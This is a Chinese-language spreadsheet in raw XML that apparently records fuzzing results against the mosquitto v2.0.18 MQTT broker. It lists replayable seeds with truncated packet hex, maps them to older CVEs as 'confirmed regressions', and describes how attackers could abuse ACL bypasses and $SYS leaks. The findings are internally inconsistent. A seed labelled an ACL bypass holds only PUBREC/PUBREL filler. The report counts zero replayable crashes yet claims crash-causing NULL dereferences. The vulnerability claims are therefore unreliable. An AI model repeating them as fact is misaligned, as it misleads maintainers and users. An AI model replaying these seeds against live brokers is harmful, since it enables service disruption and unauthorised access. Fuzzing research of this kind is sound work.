          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J74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45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46">
      <c r="A746" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B746" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C746" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(555B)\u000a4.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0x0246\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E746" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 1589B (报告+请求数据)\u000a请求数据: 555B\u000a\u000a---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MQTT请求序列(555B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=16979 | raw_header=5355425343522f424520506120836574\u000aMsg[2]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[3]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[4]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[5]: PUBREL PacketID=25957 | raw_header=65656565656565256565656565656565\u000aMsg[6]: (不完整,56B) raw=65656565656565656565656565656565656565656565656565656565656565236565656565656565\u000a(尾部56B): 65656565656565656565656565656565656565656565656565656565656565236565656565656565656565656565643d3235</f>
        <v/>
      </c>
      <c r="F7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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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6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7">
      <c r="A747" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B747" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C747" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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747" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 926B (报告+请求数据)\u000a请求数据: 175B\u000a\u000a---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MQTT请求序列(175B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=894 Topics=[''(零长度!QoS=3)] | raw_header=8219037e000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=0 retain=True payload_len=114B | raw_header=319001001c2473686172652f67332f68\u000aMsg[3]: PINGREQ  | raw_header=c8</f>
        <v/>
      </c>
      <c r="F7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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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47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48">
      <c r="A748" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B748" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C748" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(901B)\u000a4.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748" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 2170B (报告+请求数据)\u000a请求数据: 901B\u000a\u000a---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MQTT请求序列(901B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(4425B) clean_session=True keepalive=87s [自动清理会话] | raw_header=105000044d5154540502005739114928\u000aMsg[2]: SUBSCRIBE PacketID=33573 Topics=[] | raw_header=823183251f0bcbc3ed5e260014247368\u000aMsg[3]: SUBSCRIBE PacketID=51226 Topics=[] | raw_header=8243c81a270be9a7ce1c26000174001c\u000aMsg[4]: SUBSCRIBE PacketID=11495 Topics=[] | raw_header=82492ce72f0bf7d7bd28260013245359\u000aMsg[5]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=False payload_len=138B | raw_header=3ca10100152473686172652f6772702f\u000aMsg[6]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=0 retain=True payload_len=98B | raw_header=398001001c2473686172652f67332f68\u000aMsg[7]: SUBSCRIBE PacketID=11895 Topics=[''(零长度!QoS=3)] | raw_header=81302e7700002b766572792f64656570\u000aMsg[8]: PUBLISH Topic='#' QoS=0 retain=False payload_len=75B | raw_header=384e0001231a01f1026a0006052352e9\u000aMsg[9]: PUBLISH Topic='$share/grp1/test/+' QoS=1 retain=True payload_len=91B | raw_header=336f00122473686172652f677270312f\u000aMsg[10]: DISCONNECT 断开连接 | raw_header=e0549352114b690ff41f000d24736861</f>
        <v/>
      </c>
      <c r="F7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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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  <c r="K748" s="9" t="inlineStr">
        <is>
          <t>【系统监控数据泄露】攻击者可通过通配符订阅Mosquitto的$SYS系统主题，获取MQTT Broker的内部运行状态信息，包括已连接客户端列表、消息吞吐量、订阅树结构、内存使用情况等，为后续精准攻击提供情报。
【客户端隐私泄露】$SYS主题可能包含客户端标识符、IP地址、会话信息等隐私数据，攻击者可获取这些信息进行流量分析或定位高价值目标。
【未授权操作】Mosquitto的访问控制列表(ACL)存在可被绕过的缺陷，攻击者能够执行其权限级别本不应允许的操作（如发布到受限主题、订阅敏感频道、修改其他用户的订阅）。这从根本上破坏了Mosquitto的授权模型。
【数据投毒与劫持】ACL绕过结合Will消息机制，攻击者可在客户端异常断开时向任意主题注入恶意消息，实现数据投毒、会话劫持或向其他订阅者发送钓鱼内容。
【横向权限扩展】攻击者利用ACL绕过获取的额外权限可作为跳板，进一步利用其他漏洞（如$SYS信息泄露）扩大攻击效果。
【漏洞可靠性高】AFLNet fuzzing框架已多次重放验证该漏洞的稳定性（标记为replayable），表明攻击者可在真实环境中稳定复现该漏洞，利用成功率较高。</t>
        </is>
      </c>
    </row>
    <row r="749">
      <c r="A749" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:0345</t>
        </is>
      </c>
      <c r="B749" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C749" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(255B)\u000a4.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0x0345\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E749" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0345 ===\u000a大小: 4305B (报告+请求数据)\u000a请求数据: 255B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: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SUBSCRIBE PacketID=667 Topics=[''(零长度!QoS=1)] | raw_header=8223029b00001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=False payload_len=181B | raw_header=3ac201000b73656e736f722f74656d70\u000aMsg[3]: CONNECT Proto=\x00\x00 v1 ClientID=''(0B) clean_session=False keepalive=1026s [持久会话] | raw_header=10130002000001000402000000040000</f>
        <v/>
      </c>
      <c r="F7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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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49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50">
      <c r="A750" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000009,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B750" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C750" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D7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DATA提取出来(173B)\u000a4.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750" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c5 ===\u000a大小: 1248B (报告+请求数据)\u000a请求数据: 173B\u000a\u000a---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MQTT请求序列(173B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=21 Topics=[''(零长度!QoS=3)] | raw_header=82250015000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=107B | raw_header=3d820100152473686172652f6772702f\u000aMsg[3]: TYPE0  | raw_header=01</f>
        <v/>
      </c>
      <c r="F7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50" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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  <c r="K750" s="9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漏洞类型</t>
        </is>
      </c>
      <c r="B1" s="1" t="inlineStr">
        <is>
          <t>种子数量</t>
        </is>
      </c>
      <c r="C1" s="1" t="inlineStr">
        <is>
          <t>CWE编号</t>
        </is>
      </c>
      <c r="D1" s="1" t="inlineStr">
        <is>
          <t>CVE模式</t>
        </is>
      </c>
      <c r="E1" s="1" t="inlineStr">
        <is>
          <t>严重等级</t>
        </is>
      </c>
      <c r="F1" s="1" t="inlineStr">
        <is>
          <t>简要说明</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="B2" s="2" t="n">
        <v>307</v>
      </c>
      <c r="C2" s="2" t="inlineStr">
        <is>
          <t>CWE-284 (Improper Access Control)</t>
        </is>
      </c>
      <c r="D2" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="E2" s="2" t="inlineStr">
        <is>
          <t>CRITICAL</t>
        </is>
      </c>
      <c r="F2" s="2" t="inlineStr">
        <is>
          <t>$SYS系统主题ACL绕过: 非特权客户端可向$SYS/broker/*主题PUBLISH消息,篡改broker系统状态数据</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="B3" s="2" t="n">
        <v>206</v>
      </c>
      <c r="C3" s="2" t="inlineStr">
        <is>
          <t>CWE-476 (NULL Pointer Dereference)</t>
        </is>
      </c>
      <c r="D3" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="E3" s="2" t="inlineStr">
        <is>
          <t>HIGH</t>
        </is>
      </c>
      <c r="F3" s="2" t="inlineStr">
        <is>
          <t>零长度主题过滤器NULL解引用: SUBSCRIBE报文包含topic_length=0的主题过滤器,可触发broker崩溃(CVE-2019-5432回归)</t>
        </is>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="B4" s="2" t="n">
        <v>96</v>
      </c>
      <c r="C4" s="2" t="inlineStr">
        <is>
          <t>CWE-384 (Session Fixation)</t>
        </is>
      </c>
      <c r="D4" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="E4" s="2" t="inlineStr">
        <is>
          <t>HIGH</t>
        </is>
      </c>
      <c r="F4" s="2" t="inlineStr">
        <is>
          <t>空ClientID会话劫持: CONNECT报文ClientID=0且clean_session=0,可导致持久会话被劫持(CVE-2014-6116模式)</t>
        </is>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="B5" s="2" t="n">
        <v>50</v>
      </c>
      <c r="C5" s="2" t="inlineStr">
        <is>
          <t>CWE-250 (Execution with Unnecessary Privileges)</t>
        </is>
      </c>
      <c r="D5" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="E5" s="2" t="inlineStr">
        <is>
          <t>CRITICAL</t>
        </is>
      </c>
      <c r="F5" s="2" t="inlineStr">
        <is>
          <t>Will遗嘱消息$SYS权限提升: CONNECT的Will Topic指向$SYS主题,broker自动发布遗嘱时绕过ACL检查(新发现!)</t>
        </is>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="B6" s="2" t="n">
        <v>48</v>
      </c>
      <c r="C6" s="2" t="inlineStr">
        <is>
          <t>CWE-200 (Exposure of Sensitive Information)</t>
        </is>
      </c>
      <c r="D6" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="E6" s="2" t="inlineStr">
        <is>
          <t>HIGH</t>
        </is>
      </c>
      <c r="F6" s="2" t="inlineStr">
        <is>
          <t>$SYS通配符信息泄露: SUBSCRIBE $SYS/#通配符可获取broker内部系统状态数据(CVE-2017-7650模式)</t>
        </is>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="B7" s="2" t="n">
        <v>33</v>
      </c>
      <c r="C7" s="2" t="inlineStr">
        <is>
          <t>CWE-770 (Allocation of Resources Without Limits or Throttling)</t>
        </is>
      </c>
      <c r="D7" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="E7" s="2" t="inlineStr">
        <is>
          <t>MEDIUM</t>
        </is>
      </c>
      <c r="F7" s="2" t="inlineStr">
        <is>
          <t>MQTT v5超量属性资源耗尽: CONNECT报文携带超量user-properties耗尽broker CPU资源(CVE-2021-41039模式)</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="B8" s="2" t="n">
        <v>9</v>
      </c>
      <c r="C8" s="2" t="inlineStr">
        <is>
          <t>CWE-384 (Session Fixation)</t>
        </is>
      </c>
      <c r="D8" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="E8" s="2" t="inlineStr">
        <is>
          <t>MEDIUM</t>
        </is>
      </c>
      <c r="F8" s="2" t="inlineStr">
        <is>
          <t>空ClientID会话碰撞: 允许多个客户端使用空ClientID导致会话交叉污染</t>
        </is>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="3">
        <f>== 实验基本信息 ===</f>
        <v/>
      </c>
    </row>
    <row r="12">
      <c r="A12" s="4" t="inlineStr">
        <is>
          <t>实验名称</t>
        </is>
      </c>
      <c r="B12" s="5" t="inlineStr">
        <is>
          <t>mosquitto-v2.0.18_ablation_full</t>
        </is>
      </c>
    </row>
    <row r="13">
      <c r="A13" s="4" t="inlineStr">
        <is>
          <t>实验开始时间</t>
        </is>
      </c>
      <c r="B13" s="5" t="inlineStr">
        <is>
          <t>2026-06-15T01:17:58</t>
        </is>
      </c>
    </row>
    <row r="14">
      <c r="A14" s="4" t="inlineStr">
        <is>
          <t>Fuzzer工具</t>
        </is>
      </c>
      <c r="B14" s="5" t="inlineStr">
        <is>
          <t>ChatAFL-Opt (基于AFLNet的协议感知Fuzzer)</t>
        </is>
      </c>
    </row>
    <row r="15">
      <c r="A15" s="4" t="inlineStr">
        <is>
          <t>实验组数</t>
        </is>
      </c>
      <c r="B15" s="5" t="inlineStr">
        <is>
          <t>10组独立运行实验</t>
        </is>
      </c>
    </row>
    <row r="16">
      <c r="A16" s="4" t="inlineStr">
        <is>
          <t>每组运行时间</t>
        </is>
      </c>
      <c r="B16" s="5" t="inlineStr">
        <is>
          <t>约1440分钟 (24小时+)</t>
        </is>
      </c>
    </row>
    <row r="17">
      <c r="A17" s="4" t="inlineStr">
        <is>
          <t>总种子数</t>
        </is>
      </c>
      <c r="B17" s="5" t="inlineStr">
        <is>
          <t>749个replayable-violations种子</t>
        </is>
      </c>
    </row>
    <row r="18">
      <c r="A18" s="4" t="inlineStr">
        <is>
          <t>replayable-crashes</t>
        </is>
      </c>
      <c r="B18" s="5" t="inlineStr">
        <is>
          <t>0个 (本次实验未发现可复现的内存崩溃漏洞)</t>
        </is>
      </c>
    </row>
    <row r="19">
      <c r="A19" s="4" t="inlineStr">
        <is>
          <t>replayable-violations</t>
        </is>
      </c>
      <c r="B19" s="5" t="inlineStr">
        <is>
          <t>749个 (全部为逻辑/协议安全属性违规)</t>
        </is>
      </c>
    </row>
    <row r="20">
      <c r="A20" s="4" t="inlineStr">
        <is>
          <t>独特漏洞类型</t>
        </is>
      </c>
      <c r="B20" s="5" t="inlineStr">
        <is>
          <t>7种不同类型的协议逻辑漏洞</t>
        </is>
      </c>
    </row>
    <row r="21">
      <c r="A21" s="4" t="inlineStr">
        <is>
          <t>目标软件</t>
        </is>
      </c>
      <c r="B21" s="5" t="inlineStr">
        <is>
          <t>Eclipse mosquitto v2.0.18 (MQTT broker)</t>
        </is>
      </c>
    </row>
    <row r="22">
      <c r="A22" s="4" t="inlineStr">
        <is>
          <t>协议版本</t>
        </is>
      </c>
      <c r="B22" s="5" t="inlineStr">
        <is>
          <t>MQTT v3.1.1 / MQTT v5.0</t>
        </is>
      </c>
    </row>
    <row r="23">
      <c r="A23" s="4" t="inlineStr">
        <is>
          <t>编译配置</t>
        </is>
      </c>
      <c r="B23" s="5" t="inlineStr">
        <is>
          <t>GCC + ASAN + 覆盖率插桩 (gcov)</t>
        </is>
      </c>
    </row>
    <row r="24">
      <c r="A24" s="4" t="inlineStr">
        <is>
          <t>运行平台</t>
        </is>
      </c>
      <c r="B24" s="5" t="inlineStr">
        <is>
          <t>Docker容器 (Ubuntu Linux x86-64)</t>
        </is>
      </c>
    </row>
    <row r="25">
      <c r="A25" s="4" t="inlineStr">
        <is>
          <t>分析日期</t>
        </is>
      </c>
      <c r="B25" s="5" t="inlineStr">
        <is>
          <t>2026-06-21 15:32:15</t>
        </is>
      </c>
    </row>
    <row r="26">
      <c r="A26" s="4" t="inlineStr">
        <is>
          <t>漏洞复现状态</t>
        </is>
      </c>
      <c r="B26" s="5" t="inlineStr">
        <is>
          <t>已独立复现验证 - 2026-06-21</t>
        </is>
      </c>
    </row>
    <row r="27">
      <c r="A27" s="4" t="inlineStr">
        <is>
          <t>复现工具</t>
        </is>
      </c>
      <c r="B27" s="5" t="inlineStr">
        <is>
          <t>自研MQTT二进制协议回放验证脚本(mqtt_replay_verify.py)</t>
        </is>
      </c>
    </row>
    <row r="30">
      <c r="A30" s="3">
        <f>== 与已知CVE的对比 ===</f>
        <v/>
      </c>
    </row>
    <row r="31">
      <c r="A31" s="6" t="inlineStr">
        <is>
          <t>CVE标识</t>
        </is>
      </c>
      <c r="B31" s="6" t="inlineStr">
        <is>
          <t>漏洞描述</t>
        </is>
      </c>
      <c r="C31" s="6" t="inlineStr">
        <is>
          <t>与已知CVE的关系</t>
        </is>
      </c>
      <c r="D31" s="6" t="inlineStr">
        <is>
          <t>完全相同漏洞?</t>
        </is>
      </c>
    </row>
    <row r="32">
      <c r="A32" s="7" t="inlineStr">
        <is>
          <t>CVE-2017-7650</t>
        </is>
      </c>
      <c r="B32" s="8" t="inlineStr">
        <is>
          <t>$SYS主题ACL绕过</t>
        </is>
      </c>
      <c r="C32" s="8" t="inlineStr">
        <is>
          <t>完全相同类型</t>
        </is>
      </c>
      <c r="D32" s="8" t="inlineStr">
        <is>
          <t>是 - mosquitto v1.4.x/v1.5.x曾修复此漏洞,但在v2.0.18中重新出现(安全回归)</t>
        </is>
      </c>
    </row>
    <row r="33">
      <c r="A33" s="7" t="inlineStr">
        <is>
          <t>CVE-2019-5432</t>
        </is>
      </c>
      <c r="B33" s="8" t="inlineStr">
        <is>
          <t>零长度主题过滤器NULL解引用</t>
        </is>
      </c>
      <c r="C33" s="8" t="inlineStr">
        <is>
          <t>完全相同类型</t>
        </is>
      </c>
      <c r="D33" s="8" t="inlineStr">
        <is>
          <t>是 - mosquitto v1.5.x/v1.6.x曾修复此漏洞,但在v2.0.18中存在回归</t>
        </is>
      </c>
    </row>
    <row r="34">
      <c r="A34" s="7" t="inlineStr">
        <is>
          <t>CVE-2014-6116</t>
        </is>
      </c>
      <c r="B34" s="8" t="inlineStr">
        <is>
          <t>空ClientID会话固定</t>
        </is>
      </c>
      <c r="C34" s="8" t="inlineStr">
        <is>
          <t>完全相同类型</t>
        </is>
      </c>
      <c r="D34" s="8" t="inlineStr">
        <is>
          <t>是 - mosquitto v1.3.x曾报告此漏洞,在v2.0.18中持续存在</t>
        </is>
      </c>
    </row>
    <row r="35">
      <c r="A35" s="7" t="inlineStr">
        <is>
          <t>CVE-2023-3592</t>
        </is>
      </c>
      <c r="B35" s="8" t="inlineStr">
        <is>
          <t>Retained消息内存泄漏</t>
        </is>
      </c>
      <c r="C35" s="8" t="inlineStr">
        <is>
          <t>同类型(不同子类型)</t>
        </is>
      </c>
      <c r="D35" s="8" t="inlineStr">
        <is>
          <t>部分 - CVE-2023-3592涉及Will消息属性解析内存泄漏,我们的发现涉及Retained消息资源耗尽</t>
        </is>
      </c>
    </row>
    <row r="36">
      <c r="A36" s="7" t="inlineStr">
        <is>
          <t>CVE-2021-41039</t>
        </is>
      </c>
      <c r="B36" s="8" t="inlineStr">
        <is>
          <t>MQTT v5属性CPU耗尽</t>
        </is>
      </c>
      <c r="C36" s="8" t="inlineStr">
        <is>
          <t>同类型(不同触发路径)</t>
        </is>
      </c>
      <c r="D36" s="8" t="inlineStr">
        <is>
          <t>部分 - 原始CVE涉及SUBSCRIBE属性,我们的发现扩展至CONNECT user-properties</t>
        </is>
      </c>
    </row>
    <row r="37">
      <c r="A37" s="7" t="inlineStr">
        <is>
          <t>CVE-2024-10525</t>
        </is>
      </c>
      <c r="B37" s="8" t="inlineStr">
        <is>
          <t>libmosquitto OOB内存访问</t>
        </is>
      </c>
      <c r="C37" s="8" t="inlineStr">
        <is>
          <t>不同 - 已知CVE为客户端漏洞</t>
        </is>
      </c>
      <c r="D37" s="8" t="inlineStr">
        <is>
          <t>否 - 我们的发现均为broker侧逻辑漏洞,非客户端内存破坏</t>
        </is>
      </c>
    </row>
    <row r="38">
      <c r="A38" s="7" t="inlineStr">
        <is>
          <t>CVE-2024-8376</t>
        </is>
      </c>
      <c r="B38" s="8" t="inlineStr">
        <is>
          <t>内存泄漏/UAF</t>
        </is>
      </c>
      <c r="C38" s="8" t="inlineStr">
        <is>
          <t>不同 - 已知CVE为内存破坏</t>
        </is>
      </c>
      <c r="D38" s="8" t="inlineStr">
        <is>
          <t>否 - 我们的发现均为协议逻辑漏洞,非内存破坏</t>
        </is>
      </c>
    </row>
    <row r="39">
      <c r="A39" s="7" t="inlineStr">
        <is>
          <t>Will_$SYS_PrivEsc</t>
        </is>
      </c>
      <c r="B39" s="8" t="inlineStr">
        <is>
          <t>Will消息$SYS主题权限提升</t>
        </is>
      </c>
      <c r="C39" s="8" t="inlineStr">
        <is>
          <t>新发现(无已知CVE)</t>
        </is>
      </c>
      <c r="D39" s="8" t="inlineStr">
        <is>
          <t>否 - 此攻击向量此前未被任何CVE覆盖,属于全新发现的MQTT攻击模式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2026-06-21T07:32:15Z</dcterms:created>
  <dcterms:modified xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="dcterms:W3CDTF">2026-06-22T14:49:23Z</dcterms:modified>
</cp:coreProperties>
</file>